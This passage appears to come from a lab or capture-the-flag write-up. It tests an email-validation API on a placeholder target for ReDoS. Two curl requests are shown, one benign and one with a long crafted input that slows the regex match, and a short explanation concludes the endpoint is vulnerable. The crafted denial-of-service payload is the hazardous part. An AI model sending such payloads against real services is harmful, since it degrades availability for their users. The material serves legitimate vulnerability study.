```sh
$ curl "http://<TARGET IP>:3000/api/check-email?email=test_value"
{"regex":"/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/","success":false}
```

```sh
$ curl "http://<TARGET IP>:3000/api/check-email?email=jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555."
{"regex":"/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/","success":false}
```

You will notice that the API takes several seconds to respond and that longer payloads increase the evaluation time.

The difference in response time between the first cURL command above and the second is significant.
T
he API is undoubtedly vulnerable to ReDoS attacks.